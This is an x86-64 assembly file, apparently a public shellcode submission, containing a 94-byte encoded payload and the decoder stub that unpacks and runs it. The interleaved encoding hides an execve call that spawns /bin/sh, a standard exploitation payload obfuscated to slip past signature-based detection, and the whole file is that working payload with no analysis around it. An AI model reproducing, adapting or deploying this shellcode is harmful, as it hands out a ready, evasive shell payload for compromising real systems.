; Author: Robert C. Raducioiu
; Shellcode: "\xeb\x3d\x31\x27\xc0\x79\x50\xbd\x48\xa3\x89\xad\xe2\x31\x48\xec\xbb\x32\x2f\xde\x62\xe6\x69\x90\x6e\xd2\x2f\x27\x2f\x5c\x73\x24\x68\xd6\x53\x2a\x48\x01\x89\xe1\xe7\xd5\x50\x12\x57\x65\x48\xd3\x89\xa8\xe6\x4d\x83\x99\xc0\xd0\x3b\xa1\x0f\xb5\x05\xf4\xff\x48\x8d\x15\xbc\xff\xff\xff\x48\x8d\x7a\x01\x48\x89\xfe\x80\x37\xff\x74\x0a\x48\xff\xc6\xa4\x48\x83\xc0\x02\xe2\xf1\xeb\xa4";
; Shellcode length: 94 bytes

global _start

section .text

_start:

    jmp short real_start
    shellcode: db 0x31,0x27,0xc0,0x79,0x50,0xbd,0x48,0xa3,0x89,0xad,0xe2,0x31,0x48,0xec,0xbb,0x32,0x2f,0xde,0x62,0xe6,0x69,0x90,0x6e,0xd2,0x2f,0x27,0x2f,0x5c,0x73,0x24,0x68,0xd6,0x53,0x2a,0x48,0x01,0x89,0xe1,0xe7,0xd5,0x50,0x12,0x57,0x65,0x48,0xd3,0x89,0xa8,0xe6,0x4d,0x83,0x99,0xc0,0xd0,0x3b,0xa1,0x0f,0xb5,0x05,0xf4,0xff

real_start:

    lea rdx, [rel shellcode]
    lea rdi, [rdx + 1]
    mov rsi, rdi

Decode:

    xor BYTE [rdi], 0xff
    jz RunShellcode 

    inc rsi

    movsb

    add rax, 2

    loop Decode

RunShellcode:

    jmp short shellcode
